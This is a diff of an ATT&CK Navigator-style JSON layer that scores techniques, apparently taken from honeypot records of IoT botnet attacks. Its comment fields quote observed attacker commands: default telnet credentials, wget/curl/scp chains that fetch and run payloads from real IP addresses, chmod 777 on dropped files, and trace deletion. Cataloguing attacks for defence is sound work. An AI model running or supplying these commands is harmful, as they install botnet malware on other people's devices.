@@ -10,38 +10,38 @@
   "techniques": [
     {
       "techniqueID": "T1059.004",
-      "score": 1506,
+      "score": 1566,
       "comment": "shell; sh",
       "enabled": true
     },
     {
       "techniqueID": "T1110.001",
-      "score": 984,
+      "score": 1015,
       "comment": "enable\\x00 / linuxshell\\x00; root / vizxv",
       "enabled": true
     },
     {
-      "techniqueID": "T1105",
-      "score": 20,
-      "comment": "Malformed transfer reference withheld; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
+      "techniqueID": "T1222.002",
+      "score": 34,
+      "comment": ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/; >/var/d && chmod 777 /var/d && /var/d && cd /var/",
       "enabled": true
     },
     {
-      "techniqueID": "T1222.002",
-      "score": 18,
-      "comment": "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"; /bin/busybox cp /bin/echo con ; >con; /bin/busybox chmod 777 con; /bin/busybox 9xnIgnAv",
+      "techniqueID": "T1105",
+      "score": 24,
+      "comment": "Malformed transfer reference withheld; (wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
       "enabled": true
     },
     {
       "techniqueID": "T1070.004",
-      "score": 13,
-      "comment": "rm /dev/.t; rm /dev/.sh; rm /dev/.human; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
+      "score": 18,
+      "comment": "rm /dev/.t; rm /dev/.sh; rm /dev/.human; (wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
       "enabled": true
     },
     {
       "techniqueID": "T1083",
-      "score": 12,
-      "comment": "cat /etc/passwd; /bin/busybox cat /proc/mounts; /bin/busybox 9xnIgnAv",
+      "score": 16,
+      "comment": "cd /proc && cat self/cmdline; cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
       "enabled": true
     },
     {
@@ -58,6 +58,6 @@
       "#ff5d73"
     ],
     "minValue": 0,
-    "maxValue": 1506
+    "maxValue": 1566
   }
 }
